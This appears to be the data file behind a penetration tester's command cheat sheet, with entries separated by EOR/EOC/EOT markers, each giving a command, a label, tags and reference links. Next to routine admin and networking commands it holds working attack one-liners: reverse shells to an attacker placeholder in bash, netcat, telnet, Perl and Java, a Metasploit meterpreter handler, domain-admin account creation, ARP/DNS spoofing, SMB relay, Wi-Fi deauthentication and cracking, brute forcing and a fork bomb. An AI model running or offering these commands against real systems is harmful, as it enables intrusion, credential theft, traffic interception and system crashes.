EOT
http://proxychains.sourceforge.net/
https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
EOR
type [FILE]
Cat for windows
EOC
Windows
Files
EOT
https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/type.mspx?mfr=true
EOR
net group "Domain Admins" /domain
Domain Admins windows
EOC
Windows
enumeration
user information
EOT
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
https://technet.microsoft.com/en-us/library/bb490949.aspx
EOR
/data/hacking/theHarvester/theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt
harvester
EOC
Linux
scanning
user information
recon
EOT
http://www.edge-security.com/theharvester.php
https://yg.ht
EOR
/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
harvester linkedin
EOC
Linux
scanning
user information
recon
EOT
http://www.edge-security.com/theharvester.php
https://yg.ht
EOR
wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
KeePass2 Cracking
EOC
Linux
Windows
passwords
cracking
EOT
http://www.cervezhack.fr/2013/02/12/bruteforce-a-keepass-file/?lang=en
https://yg.ht
EOR
find / -iname '[SEARCH TERM]' 2>/dev/null
Find files
EOC
Linux
Files
EOT
https://yg.ht
http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples
https://www.cyberciti.biz/tips/linux-findinglocating-files-with-find-command-part-1.html
EOR
/opt/nessus/bin/nessuscmd -U -O -p[port] -V -i [plugin ID] [target IP]
Single Nessus Module
EOC
scanning
nessus
EOT
https://docs.tenable.com/nessus/6_7/Content/Command_Line/nessuscli.htm
https://yg.ht
EOR
openssl s_client -connect [domain]:443
'Telnet' s_client to SSL
EOC
Linux
certificates
EOT
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
EOR
ike-scan -A -v -id=test -f [input file] -P[PSK output file]
IKE Agressive
EOC
Linux
scanning
EOT
https://github.com/royhills/ike-scan
http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
EOR
psk-crack -d [word list e.g. rockyou.txt] [input key file]
IKE Agressive
EOC
Linux
cracking
EOT
http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
EOR
ipconfig /displaydns
Windows ARP Cache
EOC
Windows
networking
enumeration
EOT
https://technet.microsoft.com/en-gb/library/bb490921.aspx
EOR
use multi/handler
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
set PAYLOAD windows/meterpreter/reverse_https
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
set LHOST [IP]
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
set LPORT 443
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
set ExitOnSession false
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
exploit -j
MSFConsole hints
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
EOR
net user [user] [pass] /add /domain
Add a domain user from the CLI
EOC
Windows
user information
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc771865(v=ws.11).aspx
EOR
net group "Domain Admins" [user] /add /domain
Add [User] to the domain admins group
EOC
Windows
user information
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
EOR
net group "Enterprise Admins" [user] /add /domain
Add user to enterprise admins
EOC
Windows
user information
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
EOR
net localgroup "Remote Desktop Users" [user] /add /domain
Add user to the RDP group
EOC
windows
user information
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
EOR
net localgroup "Administrators" [user] /add
Add a user to the local admin group, not as useful any more
EOC
Windows
user information
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
EOR
/data/hacking/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o
SQLmap generic command
EOC
sql injection
EOT
https://github.com/sqlmapproject/sqlmap/wiki/Usage
EOR
etterfilter *.filter -o smb.ef
ARP Spoofing filter
EOC
Linux
networking
MitM
EOT
https://ettercap.github.io/ettercap/
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
EOR
ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////
ARP Spoofing gateway
EOC
Linux
networking
MitM
EOT
https://yg.ht
https://ettercap.github.io/ettercap/
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
EOR
ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
ARP Spoofing everything
EOC
Linux
networking
MitM
wifi
EOT
https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
EOR
ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
ARP Spoofing DNS
EOC
Linux
networking
MitM
wifi
EOT
https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
EOR
ipcalc -b [CIDR Subnet]
Subnet calculator
EOC
networking
subnets
EOT
https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
EOR
tcpdump -n -i [interface]
TCPDump (no DNS resolution)
EOC
networking
packet capture
EOT
http://rationallyparanoid.com/articles/tcpdump.html
https://www.cyberciti.biz/faq/tcpdump-capture-record-protocols-port/
EOR
arping -I em1 [TARGET IP]
ARPing
EOC
Linux
networking
scanning
EOT
https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
EOR
for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt
ARPing sweep network
EOC
Linux
loop
networking
scanning
EOT
https://yg.ht
https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
EOR
ifconfig eth0 192.168.0.x/24
Temporary IP
EOC
Linux
bash
networking
stealth
EOT
https://www.cyberciti.biz/faq/linux-change-ip-address/
EOR
airmon-ng start wlan1
Wireless survey WIFI
EOC
Linux
wireless
wifi
EOT
http://www.aircrack-ng.org/doku.php?id=airmon-ng
EOR
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0
Wireless survey WIFI, useful if airmon start is broke
EOC
Linux
networking
wireless
wifi
EOT
http://www.aircrack-ng.org/doku.php?id=airmon-ng
EOR
airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon
WIFI WPA handshake capture
EOC
Linux
networking
wireless
wifi
packet capture
EOT
https://www.aircrack-ng.org/doku.php?id=cracking_wpa
EOR
wpaclean [OUTPUT] [INPUT]
WIFI WPA handshake prep
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=cracking_wpa
EOR
aircrack-ng [INPUT.cap] -J [OUTPUT]
WIFI WPA handshake prep
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=cracking_wpa
EOR
airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
wep cracking
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
EOR
aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
wep cracking
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
EOR
aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
wep cracking
EOC
Linux
networking
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
EOR
aireplay-ng -3 -b [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
wep cracking
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
EOR
aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap
wep cracking
EOC
Linux
wireless
wifi
cracking
EOT
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
EOR
iptables -I OUTPUT -d [DST IP] -j DROP
Block outbound rule
EOC
Linux
networking
EOT
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
EOR
iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT
Accept inbound port rule
EOC
Linux
networking
EOT
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
EOR
medusa -M ssh -U userlist -P passwordlist -h [host]
medusa brute force
EOC
Linux
brute
EOT
http://foofus.net/goons/jmk/medusa/medusa.html
EOR
./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3
Word list generator
EOC
Linux
Windows
passwords
cracking
EOT
https://hashcat.net/wiki/doku.php?id=maskprocessor
EOR
/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic
Word list generator
EOC
Linux
Windows
cracking
EOT
https://yg.ht
https://hashcat.net/wiki/doku.php?id=maskprocessor
EOR
ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt
brute force ncrack vnc
EOC
Linux
brute
EOT
https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
EOR
dig -t AXFR [FQDN] @[SERVER IP]
DNS zone transfer
EOC
linux
networking
dns
EOT
http://www.thegeekstuff.com/2012/02/dig-command-examples
EOR
nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt
NBTScan
EOC
Linux
smb
scanning
EOT
https://yg.ht
http://unixwiz.net/tools/nbtscan.html
EOR
for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
NBTScan en masse
EOC
Linux
loop
smb
scanning
EOT
https://yg.ht
http://unixwiz.net/tools/nbtscan.html
EOR
for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v "name server"; done >> networks.txt
network discovery RDNS
EOC
loop
networking
scanning
dns
EOT
https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
EOR
cat networks-dirty.txt | grep "^[0-9]" | awk {'print $1'} | awk -F "." {'print $3"."$2"."$1".0/24"'} | sort -u > nets.txt
network discovery RDNS
EOC
loop
networking
dns
enumeration
EOT
https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
EOR
nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP
network discovery RDNS
EOC
Linux
networking
scanning
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
cat nmapScan-ARP.gnmap | grep "Status: Up" | awk {'print $2'} | awk -F "." {'print $1"."$2"."$3".0/24"'} | sort -u > networks-withlivehosts.txt
network discovery RDNS
EOC
Linux
networking
scanning
EOT
https://yg.ht
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
python -m SimpleHTTPServer [PORT]
instant web server
EOC
interesting
python
av evasion
pivoting
EOT
https://docs.python.org/2/library/simplehttpserver.html
EOR
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
smbrelay targeted
EOC
Linux
Windows
smb
MitM
impacket
privilege escalation
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
smbrelayx.py -e [PAYLOAD exe]
smbrelay reflection : note read into http -> smb refelction
EOC
Linux
Windows
smb
MitM
impacket
privilege escalation
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
responder NBNS LLMNR
EOC
Linux
smb
passwords
MitM
privilege escalation
EOT
https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
EOR
smbclient -L [TARGET] -U [USER]
List smb shares on a target host
EOC
Linux
smb
enumeration
EOT
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
EOR
strings [FILENAME] --bytes=2 |grep "^sa$" -A 4
text in binaries
EOC
Linux
Files
bash
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
telnet [IP] 25
Telnet Mail
EOC
Linux
networking
windows
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
HELO [FQDN of your RDNS]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
MAIL FROM: [SENDER ADDRESS]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
RCPT TO: [RECIPIENT ADDRESS]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
DATA
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
Subject: [SUBJECT]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
Date: [DATE]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
From: [REAL NAME] <[EMAIL]>
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
To: [REAL NAME] <[EMAIL]>
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
[MESSAGE]
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
. (don't forget the full stop)
Telnet Mail
EOC
networking
EOT
http://www.yuki-onna.co.uk/email/smtp.html
EOR
halberd -v -p 10 [URL]
load balance detection
EOC
Linux
networking
web application
scanning
EOT
https://github.com/jmbr/halberd
EOR
/data/hacking/enum4linux-0.8.9/enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum
Get a listing of all users and groups for targeting your post exploitation
EOC
Linux
smb
enumeration
user information
EOT
https://labs.portcullis.co.uk/tools/enum4linux/
EOR
cat [CLIENTNAME].domainenum | grep "^user" | cut -d ":" -f 2 | cut -d "]" -f 1 | cut -d "[" -f 2 > userlist.txt
Get a list of all the users in the domain from a full dump
EOC
Linux
smb
enumeration
user information
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
/data/hacking/vlan-hopping/frogger.sh
Check for vlans that you can hop to : may need to change the grep for interfaces
EOC
bash
networking
scanning
EOT
https://github.com/nccgroup/vlan-hopping---frogger
EOR
vconfig add em1 [VLANID]
manual vlans
EOC
Linux
bash
networking
configuration
EOT
https://yg.ht
https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-vlan.html
EOR
dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
dhcp client
EOC
Linux
bash
networking
configuration
EOT
https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
EOR
cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
dhcp lease rpm
EOC
Linux
bash
networking
EOT
https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
EOR
cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
dhcp lease deb
EOC
Linux
bash
networking
EOT
https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
EOR
ls -lt /var/lib/NetworkManager/
dhcp lease
EOC
Linux
bash
networking
EOT
https://www.cyberciti.biz/faq/tag/dhclient-command/
EOR
route add -net [CIDR] gw [IP] [INTERFACE]
route table add
EOC
Linux
bash
networking
configuration
EOT
https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
EOR
route del -net 0.0.0.0 gw [GW] eth1
route table del
EOC
Linux
bash
networking
configuration
EOT
https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
EOR
7z a -p -mem=AES report.zip [INPUT FILE]
Encrypted zip
EOC
Linux
Files
bash
EOT
https://yg.ht
https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux.html
EOR
./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc]
hashcat cpu
EOC
Linux
Windows
cracking
EOT
https://hashcat.net/wiki/
EOR
hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack
hashcat assuming that hc is an alias (kraken | pablo)
EOC
Linux
hashes
cracking
EOT
https://hashcat.net/wiki/
EOR
500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6
hashcat types
EOC
hashes
cracking
reference
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
1000 NTLM | 3000 LM
hashcat types
EOC
hashes
cracking
reference
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
1100 MScashv1 | 2100 MScashv2
hashcat types
EOC
hashes
cracking
reference
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
2500 WPA/WPA2
hashcat types
EOC
hashes
cracking
reference
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
5600 NetNTLMv2 | 5500 NetNTLMv1 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |
hashcat types
EOC
hashes
cracking
reference
EOT
https://hashcat.net/wiki/doku.php?id=example_hashes
EOR
cvs checkout [package name]
cvs check out repo
EOC
Linux
bash
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
cvs update -d .
cvs update local repo
EOC
Linux
bash
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
cvs commit -m "[Comment]" [File inc "package"]
cvs comit change with message
EOC
web address
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
cvs add [File inc "package"]
cvs add a new file
EOC
Linux
bash
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
cvs release [package or file in package]
cvs delete file
EOC
Linux
bash
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt
sslscan, you will want to git clone and make static if your in kali
EOC
loop
scanning
certificates
EOT
https://yg.ht
https://github.com/rbsec/sslscan
EOR
openssl s_client -connect victim.com:443 (this shows the chain)
sslscan cert checks
EOC
Linux
certificates
EOT
http://security.stackexchange.com/questions/70733/how-do-i-use-openssl-s-client-to-test-for-absence-of-sslv3-support
EOR
openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0=="-----BEGIN CERTIFICATE-----" {p=1}; p; $0=="-----END CERTIFICATE-----" {p=0}' (this pulls just the certificates for each in the chain)
sslscan cert checks
EOC
Linux
bash
certificates
EOT
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOR
openssl x509 -noout -text | grep -i "signature algorithm\|before\|after\|issuer\|subject:" (split the above commands output and stick in here, then manually analyse)
sslscan cert checks
EOC
Linux
bash
certificates
EOT
https://yg.h
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOR
genpasswd [CHAR LENGTH]
Password Generator
EOC
Linux
passwords
EOT
https://www.cyberciti.biz/faq/linux-random-password-generator/
EOR
iodine -P [pass] [server]
dns tunneling
EOC
networking
pivoting
EOT
http://code.kryo.se/iodine/
http://calebmadrigal.com/dns-tunneling-with-iodine/
EOR
nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt
nmap outbound tcp
EOC
Linux
networking
scanning
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt
nmap outbound upd
EOC
Linux
networking
scanning
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
nmap smb signing
EOC
Linux
smb
networking
scanning
MitM
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt
nmap devicemap all tcp
EOC
Linux
networking
scanning
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt
nmap devicemap top 1000 udp
EOC
Linux
networking
scanning
EOT
https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
EOR
grep "Discovered open port" nmap-udp-scan.txt | sed "s/\// /g" | sed "s/ /\t/g" | awk -F "\t" {'print $7"\t"$5"\t"$4"\topen"'} > devicemap-udp.tsv
nmap devicemap
EOC
Linux
bash
networking
text manipulation
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
for file in $( ls -lash | grep ".gnmap" | awk {'print $10'} ); do cat $file | grep "Ports" | grep "open" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d "-" -f 2 | cut -d "." -f 1;`.txt; done
nmap service discovery
EOC
loop
bash
text manipulation
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
cat nmapScan-[SERVICE].gnmap | grep "Ports" | grep "open" | grep -v "open|filtered" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt
nmap service discovery
EOC
Linux
bash
text manipulation
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq
Convert a user list in format "first last" to flast
EOC
Linux
bash
enumeration
user information
recon
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
https://necurity.co.uk
EOR
exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
bash reverse shell using a file handle '5'
EOC
Linux
bash
reverse shells
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
telnet reverse shell
EOC
Linux
bash
reverse shells
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
telnet [me] [port]| /bin/bash | telnet [me] [lport]
telnet reverse shell
EOC
Linux
bash
reverse shells
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl windows reverse shell
EOC
Windows
reverse shells
perl
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
Java reverse shell - replace ; with newline
EOC
Linux
reverse shells
java
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -v -n
Take a screenshot
EOC
Linux
networking
scanning
EOT
https://necurity.co.uk/netsec/2015-04-20-Screenshots-with-Nmap/
https://github.com/SpiderLabs/Nmap-Tools/commit/36d74325f5ed5a057f954c1f9dd962631766ca10
EOR
modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0
moount VDI disk image
EOC
Linux
filesystem
EOT
https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
EOR
losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/
Mount LVM filesytem / image
EOC
Linux
filesystem
EOT
https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
EOR
printf "%s" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/
Ecrypt FS mounting
EOC
Linux
filesystem
EOT
https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
EOR
cat DC_dump.txt | awk -F : '{print $1":"$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info
create medusa or hydra password list from cracked hashes
EOC
passwords
enumeration
user information
pivoting
cracking
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
netstat -tulpen
list network connections
EOC
Linux
bash
networking
EOT
https://www.cyberciti.biz/tips/tag/netstat-command
EOR
ip xfrm state list
print vpn keys
EOC
Linux
bash
networking
passwords
EOT
https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
EOR
echo 1 > /proc/sys/net/ipv4/ip_forward
enable ip forwarding in the kernel temporarily
EOC
Linux
bash
networking
pivoting
EOT
https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
EOR
:(){:|:&;:
Fork Bomb : CRASH SYSTEM
EOC
Linux
interesting
EOT
https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
EOR
iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
Iptables port forward
EOC
Linux
networking
pivoting
EOT
https://www.cyberciti.biz/tips/linux-iptables-examples.html
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables
EOR
logins -p
list users without password
EOC
enumeration
user information
solaris
EOT
http://www.net.uom.gr/Books/Manuals/usail/man/solaris/logins.1.html
EOR
svsc -a
list services
EOC
process management
solaris
EOT
http://www.oracle.com/technetwork/articles/servers-storage-admin/intro-smf-basics-s11-1729181.html
EOR
prstat -a
list processes
EOC
process management
solaris
EOT
http://docs.oracle.com/cd/E19253-01/816-5166/prstat-1m/index.html
http://solaris.reys.net/prstat-a-great-tool-for-process-monitoring/
EOR
ver
system information
EOC
Windows
enumeration
privilege escalation
EOT
https://technet.microsoft.com/en-us/library/bb491028.aspx
EOR
xterm -bg black -title "TryH4rD3r" -e "ls -la;read"
Spawn a cmd in a gui window
EOC
Linux
bash
interesting
EOT
http://invisible-island.net/xterm/
EOR
rdpy-rdpscreenshot.py 1.1.1.1
Take a screenshot of a RDP server (provided by rdpy)
EOC
Linux
scanning
recon
EOT
https://github.com/citronneur/rdpy
EOR
xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg
take a screenshot from a open X11 and convert it to a jpg
EOC
Linux
bash
scanning
pivoting
EOT
http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display
EOR
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
capture ping replies
EOC
Linux
packet capture
EOT
http://rationallyparanoid.com/articles/tcpdump.html
EOR
systeminfo /S [victim] /U [domain]/[user] /P [pass]
remote system info
EOC
Windows
enumeration
privilege escalation
EOT
https://technet.microsoft.com/en-gb/library/bb491007.aspx
EOR
fsutil fsinfo drives
list drives
EOC
Windows
forensics
EOT
https://technet.microsoft.com/en-us/library/cc753059(v=ws.11).aspx
EOR
reg query HKLM /f [text]  /t REG SZ /s
search for text in the reg
EOC
Windows
enumeration
privilege escalation
forensics
EOT
http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-us/library/cc742028(v=ws.11).aspx
EOR
findstr /si [text] '.txt|xml|xls'
grep for text in files
EOC
Windows
enumeration
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-gb/library/bb490907.aspx
EOR
net view /domain
show hosts in the current domain or add a domain for searching
EOC
Windows
networking
dns
enumeration
recon
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
